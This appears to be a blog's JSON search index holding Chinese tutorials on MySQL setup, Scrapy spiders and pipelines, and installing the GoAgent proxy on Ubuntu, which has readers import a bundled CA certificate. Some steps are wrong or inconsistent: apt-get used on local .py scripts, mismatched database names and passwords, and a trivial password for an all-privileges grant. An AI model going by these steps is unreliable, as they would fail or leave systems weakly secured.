db)</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">create database db</div></pre></td></tr></table></figure>\n</li>\n<li><p>分配权限</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">GRANT</span> ALL <span class=\"keyword\">PRIVILEGES</span> <span class=\"keyword\">ON</span> db.\\* <span class=\"keyword\">TO</span> star@localhost <span class=\"keyword\">IDENTIFIED</span> <span class=\"keyword\">BY</span> <span class=\"string\">\"123456\"</span>;</div></pre></td></tr></table></figure>\n<p><font color=\"red\">Tips：</font><br>db 是刚建的数据库<br>star 是新建的数据库用户<br>12345 是密码</p>\n</li>\n<li><p>新建table</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">use</span> <span class=\"keyword\">db</span></div></pre></td></tr></table></figure>\n</li>\n<li><p>设置编码</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">alter</span> <span class=\"keyword\">database</span> mydb <span class=\"built_in\">character</span> <span class=\"keyword\">set</span> utf8</div></pre></td></tr></table></figure>\n</li>\n<li><p>检查数据库编码是否设置成功</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">show variables like <span class=\"string\">'character_set_%'</span>;</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><img src=\"https://img.blog.csdn.net/20140522222746375\" alt=\"\"></p>\n<p>然后自己去新建table(这里就不多说了)</p>\n<h1 id=\"III、scrapy插入数据\"><a href=\"#III、scrapy插入数据\" class=\"headerlink\" title=\"III、scrapy插入数据\"></a>III、scrapy插入数据</h1><ul>\n<li>setting.py添加如下代码<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"attr\">ITEM_PIPELINES</span> = [<span class=\"string\">'wooyun.pipelines.WooyunPipeline'</span>]</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><font color=\"red\">Tips：</font><br>wooyun  是scrapy项目名<br>WooyunPipeline  是Pipeline 名</p>\n<ul>\n<li>pipeline.py <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># Define your item pipelines here</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># Don't forget to add your pipeline to the ITEM_PIPELINES setting</span></div><div class=\"line\"><span class=\"comment\"># See: http://doc.scrapy.org/topics/item-pipeline.html</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">from</span> scrapy <span class=\"keyword\">import</span> log</div><div class=\"line\"><span class=\"keyword\">from</span> twisted.enterprise <span class=\"keyword\">import</span> adbapi</div><div class=\"line\"><span class=\"keyword\">from</span> scrapy.http <span class=\"keyword\">import</span> Request</div><div class=\"line\"><span class=\"keyword\">from</span> scrapy.exceptions <span class=\"keyword\">import</span> DropItem</div><div class=\"line\"><span class=\"keyword\">from</span> scrapy.contrib.pipeline.images <span class=\"keyword\">import</span> ImagesPipeline</div><div class=\"line\"><span class=\"keyword\">import</span> time</div><div class=\"line\"><span class=\"keyword\">import</span> MySQLdb</div><div class=\"line\"><span class=\"keyword\">import</span> MySQLdb.cursors</div><div class=\"line\"><span class=\"keyword\">import</span> socket</div><div class=\"line\"><span class=\"keyword\">import</span> select</div><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"><span class=\"keyword\">import</span> os</div><div class=\"line\"><span class=\"keyword\">import</span> errno</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">WooyunPipeline</span><span class=\"params\">(object)</span>:</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        self.dbpool = adbapi.ConnectionPool(<span class=\"string\">'MySQLdb'</span>, db=<span class=\"string\">'db'</span>,</div><div class=\"line\">                user=<span class=\"string\">'star'</span>, passwd=<span class=\"string\">'cc'</span>, cursorclass=MySQLdb.cursors.DictCursor,</div><div class=\"line\">                charset=<span class=\"string\">'utf8'</span>, use_unicode=<span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">process_item</span><span class=\"params\">(self, item, spider)</span>:</span></div><div class=\"line\">        <span class=\"comment\"># run db query in thread pool</span></div><div class=\"line\">        query = self.dbpool.runInteraction(self._conditional_insert, item)</div><div class=\"line\">        query.addErrback(self.handle_error)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">return</span> item</div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_conditional_insert</span><span class=\"params\">(self, tx, item)</span>:</span></div><div class=\"line\">        <span class=\"comment\"># create record if doesn't exist.</span></div><div class=\"line\">        <span class=\"comment\"># all this block run on it's own thread</span></div><div class=\"line\">        tx.execute(<span class=\"string\">\"select \\* from wooyun where name = %s\"</span>, (item[<span class=\"string\">'name'</span>][<span class=\"number\">0</span>]))</div><div class=\"line\">        result = tx.fetchone()</div><div class=\"line\">        <span class=\"keyword\">if</span> result:</div><div class=\"line\">            log.msg(<span class=\"string\">\"Item already stored in db: %s\"</span> % item, level=log.DEBUG)</div><div class=\"line\">        <span class=\"keyword\">else</span>:</div><div class=\"line\">            tx.execute(\\</div><div class=\"line\">                <span class=\"string\">\"insert into wooyun (name,time,url) \"</span></div><div class=\"line\">                <span class=\"string\">\"values (%s, %s,%s)\"</span>,</div><div class=\"line\">                (item[<span class=\"string\">'name'</span>][<span class=\"number\">0</span>],</div><div class=\"line\">                 item[<span class=\"string\">'time'</span>][<span class=\"number\">0</span>],</div><div class=\"line\">                 item[<span class=\"string\">'url'</span>][<span class=\"number\">0</span>])</div><div class=\"line\">            )</div><div class=\"line\">            log.msg(<span class=\"string\">\"Item stored in db: %s\"</span> % item, level=log.DEBUG)</div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">handle_error</span><span class=\"params\">(self, e)</span>:</span></div><div class=\"line\">        log.err(e)</div></pre></td></tr></table></figure>\n</li>\n</ul>\n"},{"title":"抓取scrapy中文文档(我的第一个爬虫)","url":"http://huirong.github.io/2014/05/22/抓取scrapy中文文档(我的第一个爬虫)/","content":"<h1 id=\"I、新建scrapy项目\"><a href=\"#I、新建scrapy项目\" class=\"headerlink\" title=\"I、新建scrapy项目\"></a>I、新建scrapy项目</h1><p><font color=\"red\">Tips：</font>本文档默认大家已经安装scripy，如果还没，请参考<a href=\"http://doc.scrapy.org/en/latest/intro/install.html\" target=\"_blank\" rel=\"external\">Installation guide</a><br><figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"attribute\">scrapy startproject scrapyDoc</span></div></pre></td></tr></table></figure></p>\n<h1 id=\"II、新建spider\"><a href=\"#II、新建spider\" class=\"headerlink\" title=\"II、新建spider\"></a>II、新建spider</h1><h2 id=\"①-进入项目\"><a href=\"#①-进入项目\" class=\"headerlink\" title=\"① 进入项目\"></a>① 进入项目</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> scrapyDoc</div></pre></td></tr></table></figure>\n<h2 id=\"②-新建spider\"><a href=\"#②-新建spider\" class=\"headerlink\" title=\"② 新建spider\"></a>② 新建spider</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scrapy genspider ScrapyDoc scrapy-chs<span class=\"selector-class\">.readthedocs</span><span class=\"selector-class\">.org</span></div></pre></td></tr></table></figure>\n<p>即: name = ‘ScrapyDoc’<br>allowed_domains = [‘scrapy-chs.readthedocs.org’]   </p>\n<h1 id=\"III、编写代码\"><a href=\"#III、编写代码\" class=\"headerlink\" title=\"III、编写代码\"></a>III、编写代码</h1><h2 id=\"①-item-py\"><a href=\"#①-item-py\" class=\"headerlink\" title=\"① item.py\"></a>① item.py</h2><figure class=\"highlight haskell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\"># Define here the models for your scraped items</span></div><div class=\"line\"><span class=\"meta\">#</span></div><div class=\"line\"><span class=\"meta\"># See documentation in:</span></div><div class=\"line\"><span class=\"meta\"># http://doc.scrapy.org/topics/items.html</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"title\">from</span> scrapy.item <span class=\"keyword\">import</span> Item, Field</div><div class=\"line\"><span class=\"class\"></span></div><div class=\"line\"><span class=\"keyword\">class</span> <span class=\"type\">ScrapydocItem</span>(<span class=\"type\">Item</span>):</div><div class=\"line\">    title = <span class=\"type\">Field</span>()</div><div class=\"line\">    link = <span class=\"type\">Field</span>()</div><div class=\"line\">    url = <span class=\"type\">Field</span>()</div></pre></td></tr></table></figure>\n<h2 id=\"②-ScrapyDocSpider-py\"><a href=\"#②-ScrapyDocSpider-py\" class=\"headerlink\" title=\"② ScrapyDocSpider.py\"></a>② ScrapyDocSpider.py</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> scrapy.spider <span class=\"keyword\">import</span> BaseSpider</div><div class=\"line\"><span class=\"keyword\">from</span> scrapy.selector <span class=\"keyword\">import</span> HtmlXPathSelector</div><div class=\"line\"><span class=\"keyword\">from</span> scrapy.http <span class=\"keyword\">import</span> Request</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">from</span> ScrapyDoc.items <span class=\"keyword\">import</span> ScrapydocItem</div><div class=\"line\"><span class=\"keyword\">import</span> os</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#设置默认编码</span></div><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\">reload(sys)</div><div class=\"line\">sys.setdefaultencoding(<span class=\"string\">'utf-8'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ScrapyDocSpider</span><span class=\"params\">(BaseSpider)</span>:</span></div><div class=\"line\">    name = <span class=\"string\">'ScrapyDoc'</span></div><div class=\"line\">    allowed_domains = [<span class=\"string\">'scrapy-chs.readthedocs.org'</span>]</div><div class=\"line\"></div><div class=\"line\">    start_urls = [<span class=\"string\">'http://scrapy-chs.readthedocs.org/zh_CN/latest'</span>]</div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">parse</span><span class=\"params\">(self,response)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> response.url.split(<span class=\"string\">\"/\"</span>)[<span class=\"number\">-1</span>] == <span class=\"string\">''</span>:</div><div class=\"line\">            filename = response.url.split(<span class=\"string\">\"/\"</span>)[<span class=\"number\">-2</span>]</div><div class=\"line\">        <span class=\"keyword\">else</span> :</div><div class=\"line\">            dirname = response.url.split(<span class=\"string\">\"/\"</span>)[<span class=\"number\">-2</span>]</div><div class=\"line\">            <span class=\"comment\">#判断是否有此目录,如果没有就新建</span></div><div class=\"line\">            <span class=\"keyword\">if</span> os.path.isdir(dirname) == <span class=\"keyword\">False</span>:</div><div class=\"line\">                os.mkdir(dirname)</div><div class=\"line\">            filename = <span class=\"string\">'/'</span>.join(response.url.split(<span class=\"string\">\"/\"</span>)[<span class=\"number\">-2</span>:])</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">#保存文件</span></div><div class=\"line\">        open(filename,<span class=\"string\">'wb'</span>).write(response.body)</div><div class=\"line\"></div><div class=\"line\">        sel = HtmlXPathSelector(response)</div><div class=\"line\">        sites = sel.select(<span class=\"string\">'//li[@class=\"toctree-l1\"]'</span>)</div><div class=\"line\">        <span class=\"keyword\">for</span> site <span class=\"keyword\">in</span> sites:</div><div class=\"line\">            item = ScrapydocItem()</div><div class=\"line\">            item[<span class=\"string\">'title'</span>] = site.select(<span class=\"string\">'a/text()'</span>).extract()</div><div class=\"line\"></div><div class=\"line\">            <span class=\"comment\">#生成连接 begin   ,因为从页面提取的连接都是相对地址</span></div><div class=\"line\">            link = site.select(<span class=\"string\">'a/@href'</span>).extract()[<span class=\"number\">0</span>]</div><div class=\"line\">            url = response.url</div><div class=\"line\"></div><div class=\"line\">            <span class=\"comment\">#地址形式是否为 ../spiders.html 这种形式,需要回到上级地址</span></div><div class=\"line\">            <span class=\"keyword\">if</span> link.split(<span class=\"string\">'/'</span>)[<span class=\"number\">0</span>] == <span class=\"string\">'..'</span>:</div><div class=\"line\">                url2 = <span class=\"string\">'/'</span>.join(url.split(<span class=\"string\">'/'</span>)[<span class=\"number\">0</span>:<span class=\"number\">-2</span>]) + <span class=\"string\">'/'</span> + <span class=\"string\">'/'</span>.join(link.split(<span class=\"string\">'/'</span>)[<span class=\"number\">1</span>:])</div><div class=\"line\">            <span class=\"keyword\">else</span>:</div><div class=\"line\">                url2 = <span class=\"string\">'/'</span>.join(url.split(<span class=\"string\">'/'</span>)[<span class=\"number\">0</span>:<span class=\"number\">-1</span>]) + <span class=\"string\">'/'</span> + link</div><div class=\"line\"></div><div class=\"line\">            item[<span class=\"string\">'link'</span>] = [url2]</div><div class=\"line\">            <span class=\"comment\">#生成连接 end </span></div><div class=\"line\">            <span class=\"keyword\">yield</span> item</div><div class=\"line\"></div><div class=\"line\">            <span class=\"comment\">#返回多个request</span></div><div class=\"line\">            <span class=\"keyword\">yield</span> Request(url=url2,callback=self.parse)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">return</span></div></pre></td></tr></table></figure>\n<h1 id=\"IV、运行程序\"><a href=\"#IV、运行程序\" class=\"headerlink\" title=\"IV、运行程序\"></a>IV、运行程序</h1><ol>\n<li>回到scrapy项目主目录</li>\n<li><p>新建一个文件夹(我习惯将所有下载的文件保存在一个单独文件夹下)</p>\n<figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">mkdir</span> doc</div></pre></td></tr></table></figure>\n</li>\n<li><p>进入doc文件夹  </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> doc</div></pre></td></tr></table></figure>\n</li>\n<li><p>运行程序</p>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"attribute\">scrapy crawl ScrapyDoc</span></div></pre></td></tr></table></figure>\n</li>\n<li><p>现在终于将scrapy中文文档保存在本地了,不过提取到的item还没存储,可以输入如下命令行保存item</p>\n<figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">scrapy </span>crawl <span class=\"keyword\">ScrapyDoc </span>-o s.<span class=\"keyword\">json </span>-t <span class=\"keyword\">json</span></div></pre></td></tr></table></figure>\n</li>\n</ol>\n"},{"title":"ubuntu 使用 GoAgent","url":"http://huirong.github.io/2014/05/13/ubuntu_使用_goagent/","content":"<p>使用 GoAgent 可以无障碍地访问国外的网站，如Facebook、Twitter、YouTube等。<br><a id=\"more\"></a></p>\n<h1 id=\"I、安装-GoAgent\"><a href=\"#I、安装-GoAgent\" class=\"headerlink\" title=\"I、安装 GoAgent\"></a>I、安装 GoAgent</h1><ul>\n<li>下载 <a href=\"https://code.google.com/p/goagent/\" target=\"_blank\" rel=\"external\">GoAgent</a></li>\n<li>安装<br>解压之后，进入 local 目录<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">cd</span> local</div><div class=\"line\">sudo apt-<span class=\"built_in\">get</span> install addto-startup.<span class=\"keyword\">py</span></div><div class=\"line\">sudo apt-<span class=\"built_in\">get</span> install goagent-gtk.<span class=\"keyword\">py</span></div></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>期间系统会提醒安装两个软件，使用以下两个命令安装<br><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-<span class=\"built_in\">get</span> install <span class=\"keyword\">python</span>-appindicator</div><div class=\"line\">sudo apt-<span class=\"built_in\">get</span> install <span class=\"keyword\">python</span>-vte</div></pre></td></tr></table></figure></p>\n<h2 id=\"II、配置-chrome-浏览器\"><a href=\"#II、配置-chrome-浏览器\" class=\"headerlink\" title=\"II、配置 chrome 浏览器\"></a>II、配置 chrome 浏览器</h2><ol>\n<li>进入 local 文件夹，将 SwitchySharp_1_9_52.crx  拖入扩展程序安装插件<br><img src=\"https://img.blog.csdn.net/20140513192203093\" alt=\"\"></li>\n<li>此时浏览器右上角 就有goagent 图标 ，右击图标，单击选项<br><img src=\"https://img.blog.csdn.net/20140513192344937\" alt=\"\"></li>\n<li>点击导入/导出 -&gt; 从文件恢复   将SwitchyOptions.bak导入（此为配置文件）<br><img src=\"https://img.blog.csdn.net/20140513192447578\" alt=\"\"></li>\n<li>点击浏览器 设置 -&gt; 高级设置，选择 HTTPS/SSL 证书管理  将local下的CA.crt 导入<br><img src=\"https://img.blog.csdn.net/20140513192546937\" alt=\"\"></li>\n</ol>\n"},{"title":"category","url":"http://huirong.github.io/category/index.html","content":""},{"title":"about","url":"http://huirong.github.io/about/index.html","content":""},{"title":"link","url":"http://huirong.github.io/link/index.html","content":""},{"title":"search","url":"http://huirong.github.io/search/index.html","content":""},{"title":"","url":"http://huirong.github.io/css/huirong.css","content":"@font-face {\n    font-family: \"yhlkb\";\n    src: url(\"/fonts/yhlkb.eot\"); /* IE9 */\n    src: url(\"/fonts/yhlkb.eot?#iefix\") format(\"embedded-opentype\"), /* IE6-IE8 */\n    url(\"/fonts/yhlkb.woff\") format(\"woff\"), /* chrome, firefox */\n    url(\"/fonts/yhlkb.ttf\") format(\"truetype\"), /* chrome, firefox, opera, Safari, Android, iOS 4.2+ */\n    url(\"/fonts/yhlkb.svg#yhlkb\") format(\"svg\"); /* iOS 4.1- */\n    font-style: normal;\n    font-weight: normal;\n}\n\nhtml.page-home {\n  position: absolute;\n  top: 0;\n  left: 0;\n  right: 0;\n  bottom: 0;\n  background-image: url('/images/bg.jpg');\n  background-color: transparent;\n  background-size: cover;\n  background-position: center center;\n  background-repeat: no-repeat;\n\n  /*background: linear-gradient( #1abc9c, transparent), linear-gradient( 90deg, skyblue, transparent), linear-gradient( -90deg, coral, transparent);*/\n  /*background-blend-mode: screen;*/\n\n  /*background: linear-gradient(to left, #5f2c82, #49a09d);*/\n}"},{"title":"tag","url":"http://huirong.github.io/tag/index.html","content":""}]